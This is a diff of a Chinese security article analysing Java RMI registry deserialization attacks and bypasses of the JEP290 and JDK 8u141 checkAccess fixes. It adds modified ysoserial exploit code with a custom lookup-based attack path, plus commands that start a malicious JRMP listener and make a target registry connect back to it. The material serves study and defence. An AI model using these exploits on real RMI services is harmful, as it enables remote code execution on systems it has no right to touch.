@@ -4,7 +4,7 @@
 
 * 本文没有结合JDNI注入
 * 本文没有详细分析JRMP协议
-* 本文没有分析基于T3协议的RM
+* 本文没有分析基于T3协议的RMI
 
 ### 介绍
 
@@ -1035,7 +1035,7 @@ java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCo
 - Java™ SE Development Kit 7, Update 131 (JDK 7u131)
 - Java™ SE Development Kit 6, Update 141 (JDK 6u141)
 
-##### JEP290
+##### 修复方式JEP290
 
 JEP290是来限制能够被反序列化的类，主要包含以下几个机制：
 
@@ -1235,6 +1235,7 @@ JEP290默认情况下，只为RMI Register和DGC的服务端开启了。此时�
 ```java
 // exploit方法
 // 将原来的Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);替换为下述代码
+ Remote remote;
  if (payloadClass.isAssignableFrom(JRMPClient.class)){
     // 在JEP290以后，过滤了AnnationInvacationHandler
     // payloads.JRMPClient已经将恶意对象转为Remote
@@ -1247,7 +1248,8 @@ JEP290默认情况下，只为RMI Register和DGC的服务端开启了。此时�
 
 ```shell
 # 打开JRMP恶意服务端
-java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 127.0.0.1 1999 CommonsCollections1 "calc.exe"
+# 注意这里利用链的是否适用于当前java版本
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1999 CommonsCollections5 "calc.exe"
 # 向Register发送恶意序列化对象，使其发起对恶意JRMP的连接
 # 前一个ip和端口是要打的register，后面的host:port是开启JRMP恶意服务端的host和端口
 java -cp ysoserial-all.jar ysoserial.payloads.RMIRegistryExploit JRMPClient 127.0.0.1 1099 127.0.0.1:1999
@@ -1255,7 +1257,155 @@ java -cp ysoserial-all.jar ysoserial.payloads.RMIRegistryExploit JRMPClient 127.
 
 #### jdk8u141<=version<jdk8u231
 
-我们在jdk8u141下使用之前绕过JEP290的exp打
+##### 修复方式checkAccess
+
+我们在jdk8u141下使用之前绕过JEP290的exp打register（**注意攻击的exp和register分别部署在两个服务器上**），抛出异常，而且register没有弹出计算机
+
+![image-20240829101102326](./images/image-20240829101102326.png)
+
+而且这个异常很熟悉，在我们使用bind、rebind打register时也会出现，但是前面分析过这个异常并不会对我们的攻击产生影响，为什么jdk8u141后会发生变化呢，我们查看jdk8u141下的相关代码：
+
+```java
+// RegistryImpl_Skel#dispatch
+// ......
+// bind
+switch (var3) {
+    case 0:
+        // 新增代码
+        RegistryImpl.checkAccess("Registry.bind");
+
+        try {
+            var9 = var2.getInputStream();
+            var7 = (String)var9.readObject();
+            var80 = (Remote)var9.readObject();
+        } catch (ClassNotFoundException | IOException var77) {
+            throw new UnmarshalException("error unmarshalling arguments", var77);
+        } finally {
+            var2.releaseInputStream();
+        }
+
+        var6.bind(var7, var80);
+
+        try {
+            var2.getResultStream(true);
+            break;
+        } catch (IOException var76) {
+            throw new MarshalException("error marshalling return", var76);
+        }
+// ......
+```
+
+发现与之前的代码相比，register侧对应bind、rebind和unbind**在反序列化之前**进行了IP检查，防止非本地server对register进行bind、rebind和unbind操作。
+
+对于这个修复的绕过方式也很简单，由于这里的修复不涉及lookup和list方法，所以我们通过lookup或list攻击即可
+
+##### 通过lookup绕过修复攻击
+
+结合之前lookup攻击register和绕过JEP290：
+
+* 开启恶意的JRMP服务器
+
+* 将之前通过lookup攻击的恶意对象更换为ysoserial.payloads.JRMPClient，连接我们的恶意服务器
+
+##### 使用ysoserial进行攻击
+
+新增一个lookup方法，略微修改exploit和main方法
+
+```java
+public static void main(final String[] args) throws Exception {
+    // 修改参数处理，可以选择lookup和bind进行攻击
+    final String RMIMethod = args[0];
+    final String host = args[1];
+    final int port = Integer.parseInt(args[2]);
+    final String command = args[4];
+    Registry registry = LocateRegistry.getRegistry(host, port);
+    final String className = CommonsCollections1.class.getPackage().getName() +  "." + args[3];
+    final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);
+
+    // test RMI registry connection and upgrade to SSL connection on fail
+    try {
+        registry.list();
+    } catch(ConnectIOException ex) {
+        registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
+    }
+
+    // ensure payload doesn't detonate during construction or deserialization
+    exploit(registry, RMIMethod, payloadClass, command);
+}
+
+public static void exploit(final Registry registry, final String RMIMethod,
+        final Class<? extends ObjectPayload> payloadClass,
+        final String command) throws Exception {
+    new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
+        ObjectPayload payloadObj = payloadClass.newInstance();
+        Object payload = payloadObj.getObject(command);
+        String name = "pwned" + System.nanoTime();
+        Remote remote;
+        if (payloadClass.isAssignableFrom(JRMPClient.class)){
+            // 在JEP290以后，过滤了AnnationInvacationHandler
+            // 利用payloads.JRMPClient时直接讲恶意对象转为Remote
+            remote = (Remote) payload;
+        }else {
+            // 调用AnnationInvacationHandler封装了恶意对象，在动态代理转换为Remote
+            remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
+        }
+        // 可以通过lookup攻击
+        if (RMIMethod.equals("bind")){
+            try {
+                registry.bind(name, remote);
+            } catch (Throwable e) {
+                e.printStackTrace();
+            }
+        } else if (RMIMethod.equals("lookup")){
+            try {
+                lookup(registry,remote);
+            } catch (Throwable e) {
+                e.printStackTrace();
+            }
+        } else {
+            throw new Exception(RMIMethod + " not supported");
+        }
+
+        Utils.releasePayload(payloadObj, payload);
+        return null;
+    }});
+}
+// 新增lookup方法
+public static void lookup(Registry registry,Object var1) throws AccessException, NotBoundException, RemoteException {
+    try {
+
+        Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};
+
+        RemoteRef ref = (RemoteRef) Reflections.getFieldValue(registry,"ref");
+        StreamRemoteCall var2 = (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject)registry, operations, 2, 4905912898345647071L);
+
+        try {
+            ObjectOutput var3 = var2.getOutputStream();
+            var3.writeObject(var1);
+        } catch (IOException var15) {
+            throw new MarshalException("error marshalling arguments", var15);
+        }
+        ref.invoke(var2);//这个语句不能少，否则不会触发。
+    } catch (RuntimeException var16) {
+        throw var16;
+    } catch (RemoteException var17) {
+        throw var17;
+    } catch (NotBoundException var18) {
+        throw var18;
+    } catch (Exception var19) {
+        throw new UnexpectedException("undeclared checked exception", var19);
+    }
+}
+```
+
+```shell
+# 打开JRMP恶意服务端
+# 注意这里利用链的是否适用于当前java版本
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1999 CommonsCollections5 "calc.exe"
+# 向Register发送恶意序列化对象，使其发起对恶意JRMP的连接
+# 前一个ip和端口是要打的register，后面的host:port是开启JRMP恶意服务端的host和端口,lookup是选择通过lookup发起攻击
+java -cp ysoserial-all.jar ysoserial.payloads.RMIRegistryExploit lookup JRMPClient ip port ip:port
+```
 
 #### jdk8u231<=version<jdk8u241
 
